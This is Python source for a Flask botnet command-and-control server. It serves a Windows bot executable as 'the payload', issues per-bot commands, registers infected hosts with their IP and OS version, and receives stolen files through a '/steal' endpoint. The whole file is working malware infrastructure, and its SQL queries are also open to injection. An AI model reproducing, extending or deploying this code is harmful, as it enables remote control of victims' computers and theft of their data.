import MySQLdb
from base64 import b64encode as b64en, b64decode as b64de
from flask import Flask, request, render_template
from flask_table import Table, Col, create_table
import time
import pathlib

app = Flask(__name__)

@app.route('/', methods=['GET','POST'])
def index():
	if request.method == 'GET':
		# uploading the payload
		fin = open('./BotnetWin32/Release/BotnetWin32.exe','rb').read()
		return b64en(fin)
	else:
		return "OK"
		#except Exception as e: 
		#	print(str(e) + " -> " + "\n\n" + str(request.values.to_dict(flat=False)))
		#	return "NOT OK"

@app.route('/cmd', methods=['GET'])
def command():
	commands = open('commands.txt','r').read().split('\n')
	for command in commands:
		if command.startswith(request.args.get('id')):
			cmd = command[command.find('-') + 2:]
			db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")
			cursor = db.cursor()
			cursor.execute('INSERT INTO logs(id_bot, action, object, time) VALUES(\"{0}\", \"{1}\", \"{2}\", \"{3}\")'.format(request.args.get('id'), "command", cmd, time.strftime("%d %B %Y %H-%M-%S")))		
			cursor.execute('UPDATE bots SET last_sent = \"{0}\" WHERE id = {1}'.format(time.strftime("%d %B %Y %H-%M-%S"), request.args.get('id')))
			db.commit()
			return b64en(cmd.encode())

	db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")
	cursor = db.cursor()
	cursor.execute('INSERT INTO logs(id_bot, action, object, time) VALUES(\"{0}\", \"{1}\", \"{2}\", \"{3}\")'.format(request.args.get('id'), "command", "notepad.exe", time.strftime("%d %B %Y %H-%M-%S")))		
	cursor.execute('UPDATE bots SET last_sent = \"{0}\" WHERE id = {1}'.format(time.strftime("%d %B %Y %H-%M-%S"), request.args.get('id')))
	db.commit()
	return b64en(b'notepad.exe')
	
@app.route('/steal', methods=['POST'])
def steal():

	path = './Data/' + request.form['id']
	pathlib.Path(path).mkdir(parents=True, exist_ok=True) 
	
	contents = request.form['log'].split(':')
	contents[1] = contents[1].replace(' ','+')
	f1 = open(path+'/'+contents[0],'wb')
	f1.write(b64de(contents[1]))
	f1.close()

	db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")
	cursor = db.cursor()
	cursor.execute('INSERT INTO logs(id_bot, action, object, time) VALUES({0}, \"{1}\", \"{2}\", \"{3}\")'.format(request.form['id'], "steal", contents[0], time.strftime("%d %B %Y %H-%M-%S")))
	cursor.execute('UPDATE bots SET last_received = \"{0}\" WHERE id = {1}'.format(time.strftime("%d %B %Y %H-%M-%S"), request.form['id']))
	db.commit()
	return "OK"
	
@app.route('/version', methods=['POST'])
def version():
	db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")
	cursor = db.cursor()
	version = b64de(request.form['log']).decode()
	cursor.execute("INSERT INTO bots(id, ip, osversion, last_sent, last_received) VALUES (\"{0}\", \"{1}\", \"{2}\", \"{3}\", \"{4}\")".format(request.form['id'],request.environ['REMOTE_ADDR'], version, "-", "-"))
	db.commit()
	open('commands.txt', 'a').write("{0} - notepad.exe\n".format(request.form['id']))
	return "OK"

@app.route('/bots', methods=['GET'])
def bots():
	#return render_template('bots.html', table_1 = select_from_table('bots'), table_2 = select_from_table('logs'))
	return render_template('bots.html', table_1 = select_from_table('bots'), table_2 = select_from_table('logs'))

def select_from_table(table):
	db = MySQLdb.connect(host="localhost",user="root",passwd="", db="botnet")
	cursor = db.cursor()
	cursor.execute('select * from {}'.format(table))

	fields = [field[0] for field in cursor.description]
	table = create_table('table', options={'border': True})
	for field in fields:
		table.add_column(str(field), Col(str(field)))

	items = cursor.fetchall()

	final_items = list()

	for item in items:
		final_items.append(dict(zip(fields,item)))

	return table(final_items)

if __name__ == "__main__":
	app.run(host="0.0.0.0", port=80)
